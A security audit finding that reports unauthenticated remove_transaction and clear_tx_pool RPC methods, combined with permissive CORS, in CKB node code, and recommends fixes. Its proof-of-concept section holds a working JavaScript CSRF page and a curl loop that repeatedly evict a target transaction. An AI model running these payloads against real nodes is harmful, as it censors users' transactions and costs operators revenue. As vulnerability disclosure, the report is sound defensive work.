### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Grief the Tx-Pool, Preventing Legitimate Transactions from Being Mined - (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` RPC method in the Pool module carries no caller authentication or ownership check. Any entity that can reach the RPC endpoint — including any website visited by the node operator, because the server is configured with `CorsLayer::permissive()` — can silently evict any pending transaction (and all its dependents) from the tx-pool. The attacker pays nothing and loses nothing; the victim's transaction is simply gone until manually resubmitted, at which point the attacker can remove it again. This is a direct structural analog to M-30: a permissionless, cost-free operation with no meaningful guard that allows sustained griefing of legitimate pool state.

---

### Finding Description

**Root cause — no caller authorization in `remove_transaction`:**

`rpc/src/module/pool.rs`, lines 662–669:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

There is no check that the caller submitted the transaction, owns any cell referenced by it, or holds any credential. Any caller who supplies a known `tx_hash` immediately removes that transaction and every dependent from the pool.

**Root cause — permissive CORS on the RPC server:**

`rpc/src/server.rs`, line 124:

```rust
.layer(CorsLayer::permissive())
```

`CorsLayer::permissive()` emits `Access-Control-Allow-Origin: *` on every response. Browsers honour this: any JavaScript running on any origin (including a malicious third-party website) can issue a `fetch("http://127.0.0.1:8114", ...)` call to the node's default localhost address and the browser will deliver the response. No same-origin restriction blocks it.

**No authentication middleware anywhere in the server stack:**

`rpc/src/server.rs`, lines 119–129 show the full Axum layer stack: `Extension(rpc)`, `CorsLayer::permissive()`, `TimeoutLayer`. There is no token check, no HTTP Basic Auth enforcement, no IP allowlist enforced at the application layer.

**The Pool module (including `remove_transaction`) is enabled by default:**

`resource/ckb.toml`, line 190:

```
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

**End-to-end exploit flow:**

1. Attacker observes a pending transaction hash `T` in the public mempool (via `get_raw_tx_pool` or a block explorer).
2. Attacker's page (or direct HTTP client if RPC is externally exposed) sends:
   ```json
   {"jsonrpc":"2.0","method":"remove_transaction","params":["<T>"],"id":1}
   ```
   to `http://127.0.0.1:8114` (or the operator's public RPC address).
3. `remove_transaction` → `remove_local_tx` → the transaction and all descendants are evicted with no validation of caller identity.
4. The victim resubmits; the attacker removes again. The cycle repeats indefinitely at zero cost to the attacker.

The `clear_tx_pool` method (`rpc/src/module/pool.rs`, lines 684–692) is an even more severe variant: a single call wipes the entire pool.

---

### Impact Explanation

- **Transaction censorship / griefing**: Any pending transaction can be prevented from ever being mined as long as the attacker keeps calling `remove_transaction` after each resubmission. The attacker bears no cost (no fee, no stake, no locked capital).
- **Pool wipe**: `clear_tx_pool` allows a single unauthenticated call to evict every pending transaction simultaneously, causing a complete loss of unconfirmed state for the node.
- **Miner revenue loss**: A miner running a CKB node with the Pool RPC enabled loses fee revenue because high-fee transactions are continuously evicted before block assembly.
- **Dependent transaction cascade**: `remove_local_tx` removes the target and all descendants, so a single call can evict an entire transaction chain.

---

### Likelihood Explanation

- **Browser-based CSRF path (localhost nodes)**: The `CorsLayer::permissive()` setting means any website the operator visits can silently call `remove_transaction` via JavaScript `fetch`. No special network access is required beyond the operator loading a malicious page.
- **Direct path (externally exposed RPC)**: The RPC documentation explicitly warns that operators sometimes expose the port externally ("Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged" — `rpc/README.md` line 5). When exposed, any internet client can call the method directly.
- **Zero attacker cost**: Unlike M-30 where the attacker needed to hold 0.5 ETH (even temporarily), here the attacker needs nothing — not even a CKB wallet. The tx hash is publicly observable.
- **Repeatability**: The attack loop is trivially scriptable and can run continuously.

---

### Recommendation

1. **Add caller authentication to destructive pool RPCs.** Introduce an optional bearer-token or HTTP Basic Auth check enforced at the server middleware layer for state-mutating Pool methods (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`). Read-only methods can remain open.
2. **Replace `CorsLayer::permissive()` with a restrictive CORS policy.** The default should be `CorsLayer::new()` with an explicit allowlist (e.g., `localhost` origins only, or operator-configured origins). Permissive CORS on a localhost management interface is the direct enabler of the browser-based attack path.
3. **Restrict `remove_transaction` to the submitter.** Record the submitter identity (IP or a session token) at submission time and reject removal requests from other callers.

---

### Proof of Concept

**Browser-based (CSRF via permissive CORS):**

```html
<!-- attacker.com/grief.html -->
<script>
const target = "http://127.0.0.1:8114";
const txHash = "0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"; // observed from mempool

async function grief() {
  while (true) {
    await fetch(target, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        jsonrpc: "2.0", method: "remove_transaction",
        params: [txHash], id: 1
      })
    });
    await new Promise(r => setTimeout(r, 500));
  }
}
grief();
</script>
```

When the node operator visits `attacker.com`, the script continuously removes the target transaction. Because `CorsLayer::permissive()` is set, the browser delivers the response and the loop succeeds.

**Direct HTTP (externally exposed RPC):**

```bash
while true; do
  curl -s -X POST http://<node-ip>:8114 \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"remove_transaction",
         "params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],
         "id":1}'
  sleep 0.5
done
```

**Expected result**: The transaction is evicted from the pool on every iteration. `get_raw_tx_pool` confirms it is absent. The miner's block template never includes it.

**Code references:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/service_builder.rs (L65-77)
```rust
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
